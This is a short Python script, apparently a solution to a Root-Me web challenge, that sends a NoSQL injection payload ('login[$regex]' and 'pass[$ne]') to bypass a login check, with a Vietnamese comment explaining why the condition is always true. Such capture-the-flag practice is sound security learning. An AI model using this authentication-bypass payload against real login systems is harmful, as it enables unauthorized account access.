import requests

url = 'http://challenge01.root-me.org/web-serveur/ch38/'

# regex tìm match str-chr -> trùng ->pick lấy user, pass not equal '' -> luôn đúng
params = {'login[$regex]':'c','pass[$ne]':''}

r = requests.get(url, params=params)

print(r.text)